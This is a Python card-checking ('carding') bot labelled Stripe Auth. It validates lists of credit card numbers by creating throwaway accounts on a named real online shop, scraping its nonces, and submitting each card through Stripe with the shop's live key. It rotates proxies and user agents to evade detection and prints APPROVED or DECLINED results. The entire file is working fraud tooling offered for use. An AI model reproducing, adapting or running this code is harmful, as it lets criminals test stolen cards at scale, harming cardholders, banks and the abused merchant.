import requests
import os
import re
import random
import string
import time
import json
from user_agent import generate_user_agent
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Headers for Stripe request
stripe_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

def get_rotating_user_agent():
    """Generate different types of user agents"""
    return generate_user_agent()

def generate_random_email():
    """Generate random email for each account"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def parse_proxy(proxy_str):
    """Parse proxy string into components"""
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{ip}:{port}',
            'https': f'http://{username}:{password}@{ip}:{port}'
        }
    else:
        ip, port = parts[0], parts[1]
        return {
            'http': f'http://{ip}:{port}',
            'https': f'http://{ip}:{port}'
        }

def load_proxies():
    """Load proxies from proxy.txt file"""
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def get_bin_info_simple(bin_number):
    """Simple and fast BIN lookup"""
    if not bin_number or len(bin_number) < 6:
        return get_fallback_bin_info(bin_number)
    
    bin_code = bin_number[:6]
    print(f"🔍 Quick BIN lookup for {bin_code}...")
    
    try:
        # Simple BIN lookup with timeout
        api_url = f'https://lookup.binlist.net/{bin_code}'
        headers = {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = requests.get(api_url, headers=headers, timeout=3, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            brand = data.get('scheme', 'UNKNOWN').upper() if data.get('scheme') else 'UNKNOWN'
            bank = data.get('bank', {}).get('name', 'UNKNOWN BANK')
            country = data.get('country', {}).get('name', 'UNKNOWN')
            card_type = data.get('type', 'UNKNOWN').upper()
            
            # Simple brand detection from BIN
            if bin_number.startswith('4'):
                brand = 'VISA'
            elif bin_number.startswith('5'):
                brand = 'MASTERCARD'
            elif bin_number.startswith('34') or bin_number.startswith('37'):
                brand = 'AMEX'
            elif bin_number.startswith('6'):
                brand = 'DISCOVER'
                
            return {
                'bank': bank if bank not in ['', 'None', 'null'] else 'UNKNOWN BANK',
                'country': country if country not in ['', 'None', 'null'] else 'UNKNOWN',
                'brand': brand,
                'type': card_type if card_type not in ['', 'UNKNOWN'] else 'CREDIT/DEBIT',
                'level': 'STANDARD',
                'emoji': '🇺🇸' if 'UNITED STATES' in country.upper() else '🏳️'
            }
    except:
        pass
    
    # Fallback to simple pattern matching
    return get_fallback_bin_info(bin_number)

def get_fallback_bin_info(bin_number):
    """Fast fallback BIN info"""
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'UNKNOWN BANK',
            'country': 'UNKNOWN',
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'emoji': '🏳️'
        }
    
    if bin_number.startswith('4'):
        brand = 'VISA'
        bank = 'VISA BANK'
        country = 'UNITED STATES'
        emoji = '🇺🇸'
    elif bin_number.startswith('5'):
        brand = 'MASTERCARD'
        bank = 'MASTERCARD BANK'
        country = 'UNITED STATES'
        emoji = '🇺🇸'
    elif bin_number.startswith('34') or bin_number.startswith('37'):
        brand = 'AMEX'
        bank = 'AMERICAN EXPRESS'
        country = 'UNITED STATES'
        emoji = '🇺🇸'
    elif bin_number.startswith('6'):
        brand = 'DISCOVER'
        bank = 'DISCOVER BANK'
        country = 'UNITED STATES'
        emoji = '🇺🇸'
    else:
        brand = 'UNKNOWN'
        bank = 'UNKNOWN BANK'
        country = 'UNKNOWN'
        emoji = '🏳️'
    
    return {
        'bank': bank,
        'country': country,
        'brand': brand,
        'type': 'CREDIT/DEBIT',
        'level': 'STANDARD',
        'emoji': emoji
    }

def create_new_account_with_retry(session, proxy_str, max_retries=2):
    """Create a new account for each card with proxy and retry logic"""
    for attempt in range(max_retries):
        try:
            proxies = parse_proxy(proxy_str)
            
            # Get login page
            login_page_res = session.get('https://theherocollectibles.com/my-account/', 
                                       proxies=proxies, timeout=10, verify=False)
            
            # Find the nonce
            login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
            if not login_nonce_match:
                # Try alternative pattern
                login_nonce_match = re.search(r'register-nonce" value="(.*?)"', login_page_res.text)
            
            if not login_nonce_match:
                continue
                
            login_nonce = login_nonce_match.group(1)

            # Register with random email
            random_email = generate_random_email()
            
            register_data = {
                'email': random_email, 
                'woocommerce-register-nonce': login_nonce,
                '_wp_http_referer': '/my-account/', 
                'register': 'Register',
            }
            
            reg_response = session.post('https://theherocollectibles.com/my-account/', 
                                      data=register_data, proxies=proxies, timeout=10, 
                                      allow_redirects=False, verify=False)
            
            if reg_response.status_code in [302, 303, 200]:
                return True, "Account created"
                
        except Exception as e:
            print(f"Account creation attempt {attempt + 1} failed: {str(e)}")
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
    
    return False, "Account creation failed after retries"

def get_payment_nonce_with_retry(session, proxy_str, max_retries=3):
    """Get payment nonce from the payment method page"""
    for attempt in range(max_retries):
        try:
            proxies = parse_proxy(proxy_str)
            
            # Get payment methods page
            payment_page_res = session.get('https://theherocollectibles.com/my-account/add-payment-method/', 
                                         proxies=proxies, timeout=10, verify=False)
            
            # Try multiple patterns to find the nonce
            patterns = [
                r'"create_setup_intent_nonce":"(.*?)"',
                r'name="create_setup_intent_nonce" value="(.*?)"',
                r'name="_wpnonce" value="(.*?)"',
                r'nonce["\']?\\s*[:=]\\s*["\'](.*?)["\']',
                r'var nonce = ["\'](.*?)["\']',
            ]
            
            for pattern in patterns:
                payment_nonce_match = re.search(pattern, payment_page_res.text)
                if payment_nonce_match:
                    ajax_nonce = payment_nonce_match.group(1)
                    print(f"✅ Found nonce: {ajax_nonce[:10]}...")
                    return ajax_nonce, "Success"
            
            print("❌ No nonce pattern matched")
            # Debug: Save page for inspection
            with open('debug_page.html', 'w', encoding='utf-8') as f:
                f.write(payment_page_res.text)
            print("💾 Saved page content to debug_page.html for inspection")
                
        except Exception as e:
            print(f"Payment nonce attempt {attempt + 1} failed: {str(e)}")
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
    
    return None, "Failed to get payment nonce after retries"

def stripe_api_call_with_retry(url, headers, data, proxies, max_retries=2):
    """Stripe API call with retry logic"""
    for attempt in range(max_retries):
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=10, verify=False)
            return response
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            raise e

def check_card_stripe(cc_line):
    """Main function to check card via Stripe"""
    start_time = time.time()
    
    try:
        # Parse CC
        n, mm, yy, cvc = cc_line.strip().split('|')
        n = n.strip()
        mm = mm.strip()
        yy = yy.strip()
        cvc = cvc.strip()
        
        if not yy.startswith('20'):
            yy = '20' + yy
            
        # Fast BIN lookup
        bin_info = get_bin_info_simple(n[:6])
        
        # Load proxies
        proxies_list = load_proxies()
        if not proxies_list:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No proxies available
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}s

🔱𝗕𝗼𝘁 𝗯𝘆 : @mhitzxg @pr0xy_xd
"""

        # Use random proxy
        proxy_str = random.choice(proxies_list)
        proxies = parse_proxy(proxy_str)
        
        session = requests.Session()
        session.headers.update({'user-agent': get_rotating_user_agent()})

        # Format year for Stripe
        yy_stripe = yy[-2:] if len(yy) == 4 else yy

        # Step 1: Create account
        print("🔄 Creating account...")
        account_created, account_msg = create_new_account_with_retry(session, proxy_str)
        if not account_created:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Account creation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}s

🔱𝗕𝗼𝘁 𝗯𝘆 : @mhitzxg @pr0xy_xd
"""

        # Step 2: Get payment nonce
        print("🔄 Getting payment nonce...")
        ajax_nonce, nonce_msg = get_payment_nonce_with_retry(session, proxy_str)
        if not ajax_nonce:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}s

🔱𝗕𝗼𝘁 𝗯𝘆 : @mhitzxg @pr0xy_xd
"""

        # Step 3: Create payment method with Stripe
        print("🔄 Creating payment method...")
        random_email = generate_random_email()
        data = f'billing_details[name]=Test+User&billing_details[email]={random_email}&billing_details[address][country]=US&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F5127fc55bb&referrer=https%3A%2F%2Ftheherocollectibles.com&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1LwpPBCLeHcAhGxV'

        response = stripe_api_call_with_retry('https://api.stripe.com/v1/payment_methods', stripe_headers, data, proxies)
        response_data = response.json()
        
        if 'id' not in response_data:
            elapsed_time = time.time() - start_time
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stripe API Error
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}s

🔱𝗕𝗼𝘁 𝗯𝘆 : @mhitzxg @pr0xy_xd
"""

        pm_id = response_data['id']
        print(f"✅ Payment method created: {pm_id}")

        # Step 4: Create setup intent
        print("🔄 Creating setup intent...")
        headers2 = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://theherocollectibles.com',
            'referer': 'https://theherocollectibles.com/my-account/add-payment-method/',
            'user-agent': get_rotating_user_agent(),
            'x-requested-with': 'XMLHttpRequest',
        }

        data2 = {
            'action': 'create_setup_intent',
            'wcpay-payment-method': pm_id,
            '_ajax_nonce': ajax_nonce,
        }

        response2 = session.post('https://theherocollectibles.com/wp-admin/admin-ajax.php', 
                               headers=headers2, data=data2, proxies=proxies, timeout=10, verify=False)
        
        website_response = response2.json()
        elapsed_time = time.time() - start_time

        # Check response
        if website_response.get('success'):
            data_section = website_response.get('data', {})
            status = data_section.get('status', '')
            
            if status == 'succeeded':
                return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment method added successfully
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}s

🔱𝗕𝗼𝘁 𝗯𝘆 : @mhitzxg @pr0xy_xd
"""
            else:
                return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Requires action: {status}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}s

🔱𝗕𝗼𝘁 𝗯𝘆 : @mhitzxg @pr0xy_xd
"""
        else:
            error_msg = "Declined"
            if 'data' in website_response and 'message' in website_response['data']:
                error_msg = website_response['data']['message']
            
            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}s

🔱𝗕𝗼𝘁 𝗯𝘆 : @mhitzxg @pr0xy_xd
"""

    except Exception as e:
        elapsed_time = time.time() - start_time
        bin_info = get_bin_info_simple(cc_line.split('|')[0][:6]) if '|' in cc_line else get_fallback_bin_info('')
        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}s

🔱𝗕𝗼𝘁 𝗯𝘆 : @mhitzxg @pr0xy_xd
"""

def check_cards_stripe(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = check_card_stripe(cc_line)
        results.append(result)
        print(result)
        time.sleep(1)  # Small delay between checks
    return results

# For standalone testing
if __name__ == "__main__":
    test_cc = "5550600033768334|04|2030|127"
    print("Testing Stripe checker...")
    result = check_card_stripe(test_cc)
    print(result)
